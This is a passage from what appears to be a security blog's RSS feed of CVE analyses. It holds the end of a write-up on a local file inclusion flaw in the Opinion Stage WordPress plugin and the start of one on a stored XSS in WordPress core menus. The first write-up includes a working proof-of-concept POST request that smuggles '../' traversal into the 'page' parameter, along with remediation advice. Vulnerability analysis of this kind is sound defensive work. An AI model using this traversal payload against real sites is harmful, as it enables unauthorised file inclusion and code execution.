);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;require()&lt;/code&gt; call that causes &lt;strong&gt;LFI&lt;/strong&gt; uses &lt;code&gt;$path&lt;/code&gt; concatenated from the plugin path (&lt;code&gt;plugin_path&lt;/code&gt;), &lt;code&gt;$template_name&lt;/code&gt;, and &lt;code&gt;.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_menu_page() {&#xA;    if ( function_exists( &amp;#39;add_menu_page&amp;#39; ) ) {&#xA;        $os_client_logged_in = Helper::is_user_logged_in();&#xA;        if ( $os_client_logged_in ) {&#xA;            add_menu_page(&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                &amp;#39;edit_posts&amp;#39;,&#xA;                OPINIONSTAGE_MENU_SLUG,&#xA;                [ __CLASS__, &amp;#39;load_template&amp;#39; ],&#xA;                Opinionstage::get_instance()-&amp;gt;plugin_url . &amp;#39;admin/images/os-icon.svg&amp;#39;,&#xA;                &amp;#39;25.234323221&amp;#39;&#xA;            );&#xA;            add_submenu_page( OPINIONSTAGE_MENU_SLUG, &amp;#39;View My Items&amp;#39;, &amp;#39;My Items&amp;#39;, &amp;#39;edit_posts&amp;#39;, OPINIONSTAGE_MENU_SLUG );&#xA;            add_submenu_page( OPINIONSTAGE_MENU_SLUG, &amp;#39;Tutorials &amp;amp; Help&amp;#39;, &amp;#39;Tutorials &amp;amp; Help&amp;#39;, &amp;#39;edit_posts&amp;#39;, OPINIONSTAGE_HELP_RESOURCE_SLUG, [ $this, &amp;#39;load_template&amp;#39; ] );&#xA;        } else {&#xA;            add_menu_page(&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                &amp;#39;edit_posts&amp;#39;,&#xA;                OPINIONSTAGE_GETTING_STARTED_SLUG,&#xA;                [ __CLASS__, &amp;#39;load_template&amp;#39; ],&#xA;                Opinionstage::get_instance()-&amp;gt;plugin_url . &amp;#39;admin/images/os-icon.svg&amp;#39;,&#xA;                &amp;#39;25.234323221&amp;#39;&#xA;            );&#xA;            add_submenu_page( OPINIONSTAGE_GETTING_STARTED_SLUG, &amp;#39;Get Started&amp;#39;, &amp;#39;Get Started&amp;#39;, &amp;#39;edit_posts&amp;#39;, OPINIONSTAGE_GETTING_STARTED_SLUG, [ $this, &amp;#39;load_template&amp;#39; ] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;register_menu_page()&lt;/code&gt; registers two submenus with &lt;code&gt;load_template&lt;/code&gt; as the callback, depending on the user&amp;rsquo;s login state.&lt;/p&gt;&#xA;&lt;p&gt;To access the &lt;strong&gt;admin submenu&lt;/strong&gt;, the user must be logged into WordPress with at least &lt;strong&gt;Contributor&lt;/strong&gt; privileges → therefore, the required privilege for this CVE is &lt;strong&gt;Contributor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Two slugs are declared for the submenus:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const string OPINIONSTAGE_MENU_SLUG = &amp;#34;opinionstage-settings&amp;#34;&#xA;const string OPINIONSTAGE_GETTING_STARTED_SLUG = &amp;#34;opinionstage-getting-started&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login with a Contributor account&lt;/li&gt;&#xA;&lt;li&gt;Send a POST request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin.php?page=opinionstage-getting-started HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: vi,en-US;q=0.7,en;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C95a2ae30f463a8c1d010a70313f3f305e2c6e99b18056b7827132b809329c400; wp-settings-time-3=1760279584; intercom-id-y45xtsgw=f5cf9200-6f02-4b61-bb0a-94ef864e710e; intercom-session-y45xtsgw=; intercom-device-id-y45xtsgw=40def9f9-8e76-4d64-9bbc-28c12b70544f; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C2f86a0974e1c1d7b5ef8322a588e50ef5879561d1fc2f84b7c6eddf5c98ffcce&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: green&#xA;Priority: u=0, i&#xA;Content-Type: application/x-www-form-urlencoded&#xA;Content-Length: 28&#xA;&#xA;page=opinionstage-../payload&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Debugging&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/debug1.png&#34;&#xA;    alt=&#34;Debug - Value of $view_file_name&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug - Value of $view_file_name&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/debug2.png&#34;&#xA;    alt=&#34;Debug - Value of the $path being required&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug - Value of the $path being required&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;A &lt;code&gt;payload.php&lt;/code&gt; file was created for testing:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;echo &amp;#34;ABC&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/result.png&#34;&#xA;    alt=&#34;Result of successful LFI&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Result of successful LFI&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;explain&#34;&gt;&lt;span&gt;Explain&lt;/span&gt;&#xA;  &lt;a href=&#34;#explain&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;We leverage how WordPress and the plugin handle parameters: WordPress determines the admin page based on the &lt;code&gt;page&lt;/code&gt; in the URL, but the plugin reads &lt;code&gt;page&lt;/code&gt; from &lt;code&gt;$_REQUEST&lt;/code&gt; — and &lt;code&gt;$_REQUEST&lt;/code&gt; will prioritize values from the request body when the request is a POST. Therefore we send a POST to &lt;code&gt;admin.php?page=opinionstage-getting-started&lt;/code&gt; (a valid URL page to trigger the callback) while placing &lt;code&gt;page=opinionstage-../payload&lt;/code&gt; in the POST body. As a result, WordPress accepts the URL and calls the callback, while the plugin reads &lt;code&gt;page&lt;/code&gt; from &lt;code&gt;$_REQUEST&lt;/code&gt; (the body) containing the &lt;code&gt;../&lt;/code&gt; payload — allowing directory traversal and exploiting the LFI.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-53328 is an LFI caused by using the &lt;code&gt;page&lt;/code&gt; input without proper validation to build the file path for &lt;code&gt;require()&lt;/code&gt; — the &lt;code&gt;opinionstage-&lt;/code&gt; prefix is accepted but the remainder can contain &lt;code&gt;..&lt;/code&gt; &lt;code&gt;/&lt;/code&gt; &lt;code&gt;\&lt;/code&gt; to escape the views directory. The patch (v19.11.1) adds type checks, traversal blocking, and a &lt;strong&gt;template whitelist&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Do not use user input directly to build paths for &lt;code&gt;include/require&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Apply a &lt;strong&gt;whitelist&lt;/strong&gt; (or mapping) for template names.&lt;/li&gt;&#xA;&lt;li&gt;Block &lt;code&gt;..&lt;/code&gt;, &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt; or use &lt;code&gt;realpath()&lt;/code&gt; and compare with the base directory.&lt;/li&gt;&#xA;&lt;li&gt;Update the plugin to &lt;strong&gt;19.11.1&lt;/strong&gt; immediately.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/social-polls-by-opinionstage/vulnerability/wordpress-poll-survey-quiz-maker-plugin-by-opinion-stage-plugin-19-11-0-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage Plugin &amp;lt;= 19.11.0 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-58674 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-11-cve-2025-58674/</link>
      <pubDate>Sat, 11 Oct 2025 19:18:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-11-cve-2025-58674/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;A &lt;strong&gt;Stored Cross Site Scripting (XSS)&lt;/strong&gt; vulnerability occurs in WordPress Core prior to version &lt;code&gt;6.8.3&lt;/code&gt;. The root cause is improper input handling when generating dynamic pages, affecting the menu creation feature (&lt;code&gt;nav menus&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-58674&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-58674&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.8.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.8.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Author&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPressCore&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WordPress Core Versions&lt;/strong&gt;: &lt;strong&gt;v6.8.2&lt;/strong&gt; (vulnerable) and &lt;strong&gt;v6.8.3&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff/comparison tool to inspect and compare differences between the two versions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Theme&lt;/strong&gt; - &lt;a href=&#34;https://wordpress.org/themes/astra/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Astra&lt;/strong&gt;&lt;/a&gt;: A very popular theme among WordPress users, which supports quick creation of &lt;strong&gt;nav menu&lt;/strong&gt; items.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;WordPress is open source and its repository is on GitHub, so we can look at the &lt;a href=&#34;https://github.com/WordPress/WordPress/commit/e5caef19d3e842cc9c8c94621b223a9a696fb5b3&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;commit&lt;/a&gt; related to the XSS fix to observe the changes and understand where the vulnerability occurs.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;updateParentDropdown : function() {&#xA;    return this.each(function(){&#xA;        var menuItems = $( &amp;#39;#menu-to-edit li&amp;#39; ),&#xA;            parentDropdowns = $( &amp;#39;.edit-menu-item-parent&amp;#39; );&#xA;&#xA;        $.each( parentDropdowns, function() {&#xA;            var parentDropdown = $( this ),&#xA;                $html = &amp;#39;&amp;#39;,&#xA;                $selected = &amp;#39;&amp;#39;,&#xA;                currentItemID = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val(),&#xA;                currentparentID = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-parent-id&amp;#39; ).val(),&#xA;                currentItem = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ),&#xA;                currentMenuItemChild = currentItem.childMenuItems(),&#xA;                excludeMenuItem = [ currentItemID ];&#xA;&#xA;            if ( currentMenuItemChild.length &amp;gt; 0 ) {&#xA;                $.each( currentMenuItemChild, function(){&#xA;                    var childItem = $(this),&#xA;                        childID = childItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val();&#xA;&#xA;                    excludeMenuItem.push( childID );&#xA;                });&#xA;            }&#xA;&#xA;            if ( currentparentID == 0 ) {&#xA;                $selected = &amp;#39;selected&amp;#39;;&#xA;            }&#xA;&#xA;            $html &amp;#43;= &amp;#39;&amp;lt;option &amp;#39; &amp;#43; $selected &amp;#43; &amp;#39; value=&amp;#34;0&amp;#34;&amp;gt;&amp;#39; &amp;#43; wp.i18n._x( &amp;#39;No Parent&amp;#39;, &amp;#39;menu item without a parent in navigation menu&amp;#39; ) &amp;#43; &amp;#39;&amp;lt;/option&amp;gt;&amp;#39;;&#xA;&#xA;            $.each( menuItems, function() {&#xA;                var menuItem = $(this),&#xA;                $selected = &amp;#39;&amp;#39;,&#xA;                menuID = menuItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val(),&#xA;                menuTitle = menuItem.find( &amp;#39;.edit-menu-item-title&amp;#39; ).val();&#xA;&#xA;                if ( ! excludeMenuItem.includes( menuID ) ) {&#xA;                    if ( currentparentID == menuID ) {&#xA;                        $selected = &amp;#39;selected&amp;#39;;&#xA;                    }&#xA;                    $html &amp;#43;= &amp;#39;&amp;lt;option &amp;#39; &amp;#43; $selected &amp;#43; &amp;#39; value=&amp;#34;&amp;#39; &amp;#43; menuID &amp;#43; &amp;#39;&amp;#34;&amp;gt;&amp;#39; &amp;#43; menuTitle &amp;#43; &amp;#39;&amp;lt;/option&amp;gt;&amp;#39;;&#xA;                }&#xA;            });&#xA;&#xA;            parentDropdown.html( $html );&#xA;        });&#xA;        &#xA;    });&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, the value &lt;code&gt;menuTitle&lt;/code&gt; is inserted into the &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; tag and rendered into HTML using jQuery&amp;rsquo;s &lt;a href=&#34;https://api.jquery.com/html/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;html()&lt;/a&gt; method without any XSS prevention. The &lt;a href=&#34;https://api.jquery.com/html/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;html()&lt;/a&gt; function 